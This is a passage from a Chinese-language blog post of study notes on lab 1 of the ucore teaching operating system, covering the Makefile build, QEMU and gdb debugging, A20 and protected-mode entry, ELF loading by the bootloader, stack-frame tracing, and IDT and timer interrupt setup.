href="https://www.gnu.org/software/make/manual/make.html">make</a>生成执行文件的过程</p></blockquote><ul><li><p>操作系统镜像文件ucore.img是如何一步一步生成的？(需要比较详细地解释Makefile中每一条相关命令和命令参数的含义，以及说明命令导致的结果)</p><ul><li>Makefile掌握不够的话根本看不懂在写什么</li></ul></li><li><p>一个被系统认为是符合规范的硬盘主引导扇区的特征是什么？</p><ul><li>最后两个字节是0x55,0xAA</li></ul></li><li><p>后面又开了一篇博客: <a href="./ucore_makefile.md">link</a> </p></li></ul><h3 id="练习二"><a href="#练习二" class="headerlink" title="练习二"></a>练习二</h3><blockquote><p>使用qemu执行并调试lab1中的软件</p></blockquote><ol><li><p>从CPU加电后执行的第一条指令开始，单步跟踪BIOS的执行。</p><ul><li>直接将gdb连接到qemu, 断点也不用下直接停在第一条指令上</li><li>要注意的是此时<code>$pc($eip)</code>不是真实的地址, <code>(($cs&lt;&lt;4)+$eip)</code>才是</li></ul></li><li><p>在初始化位置0x7c00设置实地址断点,测试断点正常。</p><ul><li>此时在bootloader中, 设置为<code>file obj/bootblock.o</code>和<code>b *0x7c00</code>即可(别忘了<code>continue</code>要不然就是第一个问题了)</li></ul></li><li><p>从0x7c00开始跟踪代码运行,将单步跟踪反汇编得到的代码与bootasm.S和 bootblock.asm进行比较。</p><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile"><span class="hljs-comment">#改写Makefile文件</span><br><span class="hljs-section">debug: <span class="hljs-variable">$(UCOREIMG)</span></span><br>    <span class="hljs-variable">$(V)</span><span class="hljs-variable">$(TERMINAL)</span> -e <span class="hljs-string">&quot;<span class="hljs-variable">$(QEMU)</span> -S -s -d in_asm -D <span class="hljs-variable">$(BINDIR)</span>/q.log -parallel stdio -hda <span class="hljs-variable">$&lt;</span> -serial null&quot;</span><br>    <span class="hljs-variable">$(V)</span>sleep 2<br>    <span class="hljs-variable">$(V)</span><span class="hljs-variable">$(TERMINAL)</span> -e <span class="hljs-string">&quot;gdb -q -tui -x tools/gdbinit&quot;</span><br></code></pre></div></td></tr></table></figure><p>在调用qemu时增加<code>-d in_asm -D q.log</code>参数，便可以将运行的汇编指令保存在q.log中。</p></li></ol><h3 id="练习三"><a href="#练习三" class="headerlink" title="练习三"></a>练习三</h3><blockquote><p>分析bootloader进入保护模式的过程.</p></blockquote><ul><li><p>为何开启A20，以及如何开启A20</p><ul><li><p>Intel早期的8086 CPU提供了20根地址线，但寄存器只有16位，所以使用<strong>段寄存器值 &lt;&lt; 4 + 段内偏移值</strong>的方法来访问到所有内存，但按这种方式来计算出的地址的最大值为1088KB，超过20根地址线所能表示的范围，会发生“回卷”（和整数溢出有点类似）。但下一代的基于Intel 80286 CPU的计算机系统提供了24根地址线，当CPU计算出的地址超过1MB时便<strong>不会发生回卷</strong>，而这就造成了<strong>向下不兼容</strong>。为了保持完全的向下兼容性，IBM在计算机系统上加个硬件逻辑来模仿早期的回绕特征，而这就是<strong>A20 Gate</strong>。</p></li><li><p>A20 Gate的方法是把A20地址线控制和键盘控制器的一个输出进行AND操作，这样来控制A20地址线的打开（使能）和关闭（屏蔽\禁止）。一开始时A20地址线控制是被屏蔽的（总为0），直到系统软件通过一定的IO操作去打开它。当A20 地址线控制禁止时，则程序就像在8086中运行，1MB以上的地址不可访问；保护模式下A20地址线控制必须打开。A20控制打开后，内存寻址将不会发生回卷。</p></li><li><p>在当前环境中，所用到的键盘控制器8042的IO端口只有0x60和0x64两个端口。8042通过这些端口给键盘控制器或键盘发送命令或读取状态。输出端口P2用于特定目的。位0（P20引脚）用于实现CPU复位操作，位1（P21引脚）用于控制A20信号线的开启与否。</p></li><li><p>有关概念:</p><p>8042有4个寄存器：</p><ul><li>1个8-bit长的Input buffer；Write-Only；</li><li>1个8-bit长的Output buffer； Read-Only；</li><li>1个8-bit长的Status Register；Read-Only；</li><li>1个8-bit长的Control Register；Read/Write。</li></ul><p>有两个端口地址：60h和64h，有关对它们的读写操作描述如下：</p><ul><li>读60h端口，读output buffer</li><li>写60h端口，写input buffer</li><li>读64h端口，读Status Register</li><li>操作Control Register，首先要向64h端口写一个命令（20h为读命令，60h为写命令），然后根据命令从60h端口读出Control Register的数据或者向60h端口写入Control Register的数据（64h端口还可以接受许多其它的命令）。<br>如果要<strong>写output</strong>, 则向64h写入命令0d1h, 向input buf写入control register中命令的参数</li></ul><p>Status Register的定义（要用bit 0和bit 1）：</p><table><thead><tr><th>bit</th><th>meaning</th></tr></thead><tbody><tr><td>0</td><td>output register (60h) 中有数据</td></tr><tr><td><strong>1</strong></td><td><strong>input register (60h/64h) 有数据</strong></td></tr><tr><td>2</td><td>系统标志（上电复位后被置为0）</td></tr><tr><td>3</td><td>data in input register is command (1) or data (0)</td></tr><tr><td>4-7</td><td>(Nothing special)</td></tr></tbody></table></li></ul></li></ul><p><img src="https://i.loli.net/2021/11/15/o2X7OPRbzxvVeUS.png" alt="img"></p><ul><li><p>代码中的流程:</p><p><strong>读0x64端口(读Status Register), 等待第二位(标志input buffer是否为空)等于0<br>向64h发送0d1h命令(作用是写output port,即一个键盘控制器命令),<br>然后等待input buf为空时向0x60h写入control register的参数(即要输出在output port上的值)</strong></p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">    # Enable A20:<br>    #  For backwards compatibility with the earliest PCs, physical<br>    #  address line 20 is tied low, so that addresses higher than<br>    #  1MB wrap around to zero by default. This code undoes this.<br>seta20.1:<br>    inb $0x64, %al                                  # Wait for not busy(8042 input buffer empty).<br>    testb $0x2, %al<br>    jnz seta20.1<br><br>    movb $0xd1, %al                                 # 0xd1 -&gt; port 0x64<br>    outb %al, $0x64                                 # 0xd1 means: write data to 8042&#x27;s P2 port<br><br>seta20.2:<br>    inb $0x64, %al                                  # Wait for not busy(8042 input buffer empty).<br>    testb $0x2, %al<br>    jnz seta20.2<br><br>    movb $0xdf, %al                                 # 0xdf -&gt; port 0x60<br>    outb %al, $0x60                                 # 0xdf = 11011111, means set P2&#x27;s A20 bit(the 1 bit) to 1<br></code></pre></div></td></tr></table></figure><ul><li>如何初始化GDT表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">lgdt gdtdesc<br># Bootstrap GDT<br>.p2align 2                                          # force 4 byte alignment<br>gdt:<br>    SEG_NULLASM                                     # null seg<br>    SEG_ASM(STA_X|STA_R, 0x0, 0xffffffff)           # code seg for bootloader and kernel<br>    SEG_ASM(STA_W, 0x0, 0xffffffff)                 # data seg for bootloader and kernel<br><br>gdtdesc:<br>    .word 0x17                                      # sizeof(gdt) - 1<br>    .long gdt                                       # address gdt<br>    <br># asm.h<br>#define STA_X       0x8     // Executable segment<br>#define STA_W       0x2     // Writeable (non-executable segments)<br>#define STA_R       0x2     // Readable (executable segments)<br></code></pre></div></td></tr></table></figure><ul><li>进入保护模式：通过将cr0寄存器PE位置1便开启了保护模式</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">movl %cr0, %eax<br>orl $CR0_PE_ON, %eax<br>movl %eax, %cr0<br></code></pre></div></td></tr></table></figure><ul><li>通过长跳转更新cs的基地址</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">ljmp $PROT_MODE_CSEG, $protcseg<br>.code32<br>protcseg:<br></code></pre></div></td></tr></table></figure><ul><li>设置段寄存器，并建立堆栈</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">movw $PROT_MODE_DSEG, %ax<br>movw %ax, %ds<br>movw %ax, %es<br>movw %ax, %fs<br>movw %ax, %gs<br>movw %ax, %ss<br>movl $0x0, %ebp<br>movl $start, %esp<br></code></pre></div></td></tr></table></figure><ul><li>转到保护模式完成，进入boot主方法</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asm">call bootmain<br></code></pre></div></td></tr></table></figure><h3 id="练习四"><a href="#练习四" class="headerlink" title="练习四"></a>练习四</h3><blockquote><p>分析bootloader加载ELF格式的OS的过程。</p></blockquote><ul><li>IDE: Integrated Drive Electronics，它的本意是指把控制器与盘体集成在一起的硬盘驱动器，IDE是表示硬盘的传输接口。</li></ul><p>bootloader让CPU进入保护模式后，下一步的工作就是从硬盘上加载并运行OS。考虑到实现的简单性，bootloader的访问硬盘都是LBA模式的PIO（Program IO）方式，即所有的IO操作是通过CPU访问硬盘的IO地址寄存器完成。</p><p>一般主板有2个IDE通道，每个通道可以接2个IDE硬盘。访问第一个硬盘的扇区可设置IO地址寄存器0x1f0-0x1f7实现的，具体参数见下表。一般第一个IDE通道通过访问IO地址0x1f0-0x1f7来实现，第二个IDE通道通过访问0x170-0x17f实现。每个通道的主从盘的选择通过第6个IO偏移地址寄存器来设置。</p><table><thead><tr><th>IO地址</th><th>功能</th></tr></thead><tbody><tr><td>0x1f0</td><td>读数据，当0x1f7不为忙状态时，可以读。</td></tr><tr><td>0x1f2</td><td>要读写的扇区数，每次读写前，你需要表明你要读写几个扇区。最小是1个扇区</td></tr><tr><td>0x1f3</td><td>如果是LBA模式，就是LBA参数的0-7位</td></tr><tr><td>0x1f4</td><td>如果是LBA模式，就是LBA参数的8-15位</td></tr><tr><td>0x1f5</td><td>如果是LBA模式，就是LBA参数的16-23位</td></tr><tr><td>0x1f6</td><td>第0~3位：如果是LBA模式就是24-27位 第4位：为0主盘；为1从盘</td></tr><tr><td>0x1f7</td><td>状态和命令寄存器。操作时先给命令，再读取，如果不是忙状态就从0x1f0端口读数据</td></tr></tbody></table><p>当前 硬盘数据是储存到硬盘扇区中，一个扇区大小为512字节。读一个扇区的流程（可参看boot/bootmain.c中的readsect函数实现）大致如下：</p><ol><li>等待磁盘准备好</li><li>发出读取扇区的命令</li><li>等待磁盘准备好</li><li>把磁盘扇区数据读到指定内存</li></ol><p><strong>分析bootloader加载ELF格式的OS的过程。</strong> </p><p>首先看readsect函数，<br><code>readsect</code>从设备的第secno扇区读取数据到dst位置</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">readsect</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *dst, <span class="hljs-keyword">uint32_t</span> secno)</span> </span>&#123;<br>    waitdisk();<br><br>    outb(<span class="hljs-number">0x1F2</span>, <span class="hljs-number">1</span>);                         <span class="hljs-comment">// 设置读取扇区的数目为1</span><br>    outb(<span class="hljs-number">0x1F3</span>, secno &amp; <span class="hljs-number">0xFF</span>);<br>    outb(<span class="hljs-number">0x1F4</span>, (secno &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>);<br>    outb(<span class="hljs-number">0x1F5</span>, (secno &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>);<br>    outb(<span class="hljs-number">0x1F6</span>, ((secno &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xF</span>) | <span class="hljs-number">0xE0</span>);<br>        <span class="hljs-comment">// 上面四条指令联合制定了扇区号</span><br>        <span class="hljs-comment">// 在这4个字节线联合构成的32位参数中</span><br>        <span class="hljs-comment">//   29-31位强制设为1</span><br>        <span class="hljs-comment">//   28位(=0)表示访问&quot;Disk 0&quot;</span><br>        <span class="hljs-comment">//   0-27位是28位的偏移量</span><br>    outb(<span class="hljs-number">0x1F7</span>, <span class="hljs-number">0x20</span>);                      <span class="hljs-comment">// 0x20命令，读取扇区</span><br><br>    waitdisk();<br><br>    insl(<span class="hljs-number">0x1F0</span>, dst, SECTSIZE / <span class="hljs-number">4</span>);         <span class="hljs-comment">// 读取到dst位置，</span><br>                                            <span class="hljs-comment">// magic number = 4因为这里以DW为单位</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>readseg简单包装了readsect，可以从设备读取任意长度的内容。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">readseg</span><span class="hljs-params">(<span class="hljs-keyword">uintptr_t</span> va, <span class="hljs-keyword">uint32_t</span> count, <span class="hljs-keyword">uint32_t</span> offset)</span> </span>&#123;<br>    <span class="hljs-keyword">uintptr_t</span> end_va = va + count;<br><br>    va -= offset % SECTSIZE;<br><br>    <span class="hljs-keyword">uint32_t</span> secno = (offset / SECTSIZE) + <span class="hljs-number">1</span>; <br>    <span class="hljs-comment">// 加1因为0扇区被引导占用</span><br>    <span class="hljs-comment">// ELF文件从1扇区开始</span><br><br>    <span class="hljs-keyword">for</span> (; va &lt; end_va; va += SECTSIZE, secno ++) &#123;<br>        readsect((<span class="hljs-keyword">void</span> *)va, secno);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在bootmain函数中，</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">bootmain</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-comment">// 首先读取ELF的头部</span><br>    readseg((<span class="hljs-keyword">uintptr_t</span>)ELFHDR, SECTSIZE * <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// 通过储存在头部的幻数判断是否是合法的ELF文件</span><br>    <span class="hljs-keyword">if</span> (ELFHDR-&gt;e_magic != ELF_MAGIC) &#123;<br>        <span class="hljs-keyword">goto</span> bad;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proghdr</span> *<span class="hljs-title">ph</span>, *<span class="hljs-title">eph</span>;</span><br><br>    <span class="hljs-comment">// ELF头部有描述ELF文件应加载到内存什么位置的描述表，</span><br>    <span class="hljs-comment">// 先将描述表的头地址存在ph</span><br>    ph = (struct proghdr *)((<span class="hljs-keyword">uintptr_t</span>)ELFHDR + ELFHDR-&gt;e_phoff);<br>    eph = ph + ELFHDR-&gt;e_phnum;<br><br>    <span class="hljs-comment">// 按照描述表将ELF文件中数据载入内存</span><br>    <span class="hljs-keyword">for</span> (; ph &lt; eph; ph ++) &#123;<br>        readseg(ph-&gt;p_va &amp; <span class="hljs-number">0xFFFFFF</span>, ph-&gt;p_memsz, ph-&gt;p_offset);<br>    &#125;<br>    <span class="hljs-comment">// ELF文件0x1000位置后面的0xd1ec比特被载入内存0x00100000</span><br>    <span class="hljs-comment">// ELF文件0xf000位置后面的0x1d20比特被载入内存0x0010e000</span><br><br>    <span class="hljs-comment">// 根据ELF头部储存的入口信息，找到内核的入口</span><br>    ((<span class="hljs-keyword">void</span> (*)(<span class="hljs-keyword">void</span>))(ELFHDR-&gt;e_entry &amp; <span class="hljs-number">0xFFFFFF</span>))();<br><br>bad:<br>    outw(<span class="hljs-number">0x8A00</span>, <span class="hljs-number">0x8A00</span>);<br>    outw(<span class="hljs-number">0x8A00</span>, <span class="hljs-number">0x8E00</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="练习五"><a href="#练习五" class="headerlink" title="练习五"></a>练习五</h3><blockquote><p>实现函数调用堆栈跟踪函数</p></blockquote><p class="note note-primary"style="font-style:italic;background-color:rgb(240,230,250)">发现并没有在这里提到stabs类型文件, 补充一下</p><ul><li>Stabs refers to a format for information that describes a program to a debugger</li><li>This debugging information describes features of the source file like <u>line numbsers, the types and scopes of variables, and function names, parameters, and scopes.</u> </li><li>generated by compiler into the ‘.s’ file</li><li><a href="https://www.sourceware.org/gdb/onlinedocs/stabs.pdf">documentation</a> </li></ul><p>ss:ebp指向的堆栈位置储存着caller的ebp，以此为线索可以得到所有使用堆栈的函数ebp。<br>ss:ebp+4指向caller调用时的eip，ss:ebp+8等是（可能的）参数。</p><p>输出中，堆栈最深一层为</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">ebp:<span class="hljs-number">0x00007bf8</span> eip:<span class="hljs-number">0x00007d68</span> args:<span class="hljs-number">0x00000000</span> <span class="hljs-number">0x00000000</span> <span class="hljs-number">0x00000000</span> <span class="hljs-number">0x00007c4f</span><br>    &lt;unknow&gt;: -- <span class="hljs-number">0x00007d67</span> --<br></code></pre></div></td></tr></table></figure><p>其对应的是第一个使用堆栈的函数，bootmain.c中的bootmain。<br>bootloader设置的堆栈从0x7c00开始，使用”call bootmain”转入bootmain函数。<br>call指令压栈，所以bootmain中ebp为0x7bf8。</p><p><strong>print_stackframe:</strong> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">+|  栈底方向    | 高位地址</span><br><span class="hljs-comment"> |    ...       |</span><br><span class="hljs-comment"> |    ...       |</span><br><span class="hljs-comment"> |  参数3       |</span><br><span class="hljs-comment"> |  参数2       |</span><br><span class="hljs-comment"> |  参数1       |</span><br><span class="hljs-comment"> |  返回地址     |</span><br><span class="hljs-comment"> |  上一层[ebp]  | &lt;-------- [ebp]</span><br><span class="hljs-comment"> |  局部变量     |  低位地址</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">uint32_t</span> eip, ebp;<br>eip = read_eip();<br>ebp = read_ebp();<br><span class="hljs-keyword">int</span> i, j;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; ebp != <span class="hljs-number">0</span> &amp;&amp; i &lt; STACKFRAME_DEPTH; i++)<br>&#123;<br>    cprintf(<span class="hljs-string">&quot;ebp:0x%08x eip:0x%08x args:&quot;</span>, ebp, eip);<br>    <span class="hljs-keyword">for</span> (j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>    &#123;<br>        cprintf(<span class="hljs-string">&quot;0x%08x &quot;</span>, ((<span class="hljs-keyword">uint32_t</span> *)ebp + <span class="hljs-number">2</span>)[j]);<br>    &#125;<br>    cprintf(<span class="hljs-string">&quot;\n&quot;</span>);<br>    print_debuginfo(eip - <span class="hljs-number">1</span>);<br>    eip = ((<span class="hljs-keyword">uint32_t</span> *)ebp)[<span class="hljs-number">1</span>];<br>    ebp = ((<span class="hljs-keyword">uint32_t</span> *)ebp)[<span class="hljs-number">0</span>];<br>&#125;<br></code></pre></div></td></tr></table></figure><p>需要注意的问题:</p><ul><li><p>gdb命令通过文件加载debuginfo, 包括源代码和函数位置, 一般我们直接使用gdb <em>filepath</em> -q直接进入调试界面, 而本实验先启动qemu(使用.img镜像文件), 然后gdb通过remote连接到qemu中, Makefile中指定的gdbinit文件可以指定一些初始命令.</p><p>这样, gdb没有任何debuginfo, 全靠远程端口给出信息, 所以我们可以在init文件中添加file命令加载符号信息</p></li></ul><h3 id="练习六"><a href="#练习六" class="headerlink" title="练习六"></a>练习六</h3><blockquote><p>完善中断初始化和处理</p></blockquote><ul><li><p>中断描述符表（也可简称为保护模式下的中断向量表）中一个表项占多少字节？其中哪几位代表中断处理代码的入口？</p><ul><li><p>一个表项的结构如下</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Gate descriptors for interrupts and traps */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">gatedesc</span> &#123;</span><br>    <span class="hljs-keyword">unsigned</span> gd_off_15_0 : <span class="hljs-number">16</span>;        <span class="hljs-comment">// low 16 bits of offset in segment</span><br>    <span class="hljs-keyword">unsigned</span> gd_ss : <span class="hljs-number">16</span>;            <span class="hljs-comment">// segment selector</span><br>    <span class="hljs-keyword">unsigned</span> gd_args : <span class="hljs-number">5</span>;            <span class="hljs-comment">// # args, 0 for interrupt/trap gates</span><br>    <span class="hljs-keyword">unsigned</span> gd_rsv1 : <span class="hljs-number">3</span>;            <span class="hljs-comment">// reserved(should be zero I guess)</span><br>    <span class="hljs-keyword">unsigned</span> gd_type : <span class="hljs-number">4</span>;            <span class="hljs-comment">// type(STS_&#123;TG,IG32,TG32&#125;)</span><br>    <span class="hljs-keyword">unsigned</span> gd_s : <span class="hljs-number">1</span>;                <span class="hljs-comment">// must be 0 (system)</span><br>    <span class="hljs-keyword">unsigned</span> gd_dpl : <span class="hljs-number">2</span>;            <span class="hljs-comment">// descriptor(meaning new) privilege level</span><br>    <span class="hljs-keyword">unsigned</span> gd_p : <span class="hljs-number">1</span>;                <span class="hljs-comment">// Present</span><br>    <span class="hljs-keyword">unsigned</span> gd_off_31_16 : <span class="hljs-number">16</span>;        <span class="hljs-comment">// high bits of offset in segment</span><br>&#125;;<br></code></pre></div></td></tr></table></figure></li><li><p>该表项的大小为<code>16+16+5+3+4+1+2+1+16 == 8*8</code>bit，即<strong>8字节</strong>。</p></li><li><p>根据IDT表项的结构，我们可以得知，IDT表项的第二个成员<code>gd_ss</code>为段选择子，第一个成员<code>gd_off_15_0</code>和最后一个成员<code>gd_off_31_16</code>共同组成一个段内偏移地址。根据段选择子和段内偏移地址就可以得出中断处理程序的地址。</p></li></ul></li><li><p>编程完善kern/trap/trap.c中对中断向量表进行初始化的函数idt_init.</p><ul><li><p>具体实现如下，详细信息以注释的形式写入代码中。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">idt_init</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>  <span class="hljs-comment">// __vectors定义于vector.S中</span><br>  <span class="hljs-keyword">extern</span> <span class="hljs-keyword">uintptr_t</span> __vectors[];<br>  <span class="hljs-keyword">int</span> i;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(idt) / <span class="hljs-keyword">sizeof</span>(struct gatedesc); i ++)<br>      <span class="hljs-comment">// 目标idt项为idt[i]</span><br>      <span class="hljs-comment">// 该idt项为内核代码，所以使用GD_KTEXT段选择子</span><br>      <span class="hljs-comment">// 中断处理程序的入口地址存放于__vectors[i]</span><br>      <span class="hljs-comment">// 特权级为DPL_KERNEL</span><br>      SETGATE(idt[i], <span class="hljs-number">0</span>, GD_KTEXT, __vectors[i], DPL_KERNEL);<br>  <span class="hljs-comment">// 设置从用户态转为内核态的中断的特权级为DPL_USER</span><br>  <span class="hljs-comment">// 好像就是int 0x80, 不过我没有在任何地方看到说明, 尝试自己写这一段代码花了好多无谓的时间</span><br>  SETGATE(idt[T_SWITCH_TOK], <span class="hljs-number">0</span>, GD_KTEXT, __vectors[T_SWITCH_TOK], DPL_USER);<br>  <span class="hljs-comment">// 加载该IDT</span><br>  lidt(&amp;idt_pd);<br>&#125;<br></code></pre></div></td></tr></table></figure></li></ul></li><li><p>编程完善trap.c中的中断处理函数trap_dispatch**(called by trap(), and trap() called in trapentry.S)**，在对时钟中断进行处理的部分填写trap函数中处理时钟中断的部分，使操作系统每遇到100次时钟中断后，调用print_ticks子程序，向屏幕上打印一行文字”100 ticks”。</p><ul><li><p>这个实现还是比较简单的，注释都说清楚了</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">case</span> IRQ_OFFSET + IRQ_TIMER:        <span class="hljs-comment">// 全局变量ticks定义于kern/driver/clock.c</span><br>ticks++;       <br><span class="hljs-keyword">if</span>(ticks % TICK_NUM == <span class="hljs-number">0</span>)            <br>        print_ticks();        <br><span class="hljs-keyword">break</span>;    <span class="hljs-comment">// .........</span><br></code></pre></div></td></tr></table></figure></li></ul></li><li><p>结果:</p></li></ul><img src="https://i.loli.net/2021/11/20/n8cShiWkulDqzpP.png" alt="image-20211120131815160" style="zoom:80%;" /><h3 id="拓展练习"><a href="#拓展练习" class="headerlink" title="拓展练习"></a>拓展练习</h3><blockquote><p>Challenge 1: 扩展proj4,增加syscall功能，即增加一用户态函数（可执行一特定系统调用：获得时钟计数值），当内核初始完毕后，可从内核态返回到用户态的函数，而用户态的函数又通过系统调用得到内核态的服务</p></blockquote><p>详见知识点</p><blockquote><p>Challenge 2:用键盘实现用户模式内核模式切换。具体目标是：“键盘输入3时切换到用户模式，键盘输入0时切换到内核模式”。 基本思路是借鉴软中断(syscall功能)的代码，并且把trap.c中软中断处理的设置语句拿过来。</p></blockquote><h1 id="Lab2"><a href="#Lab2" class="headerlink" 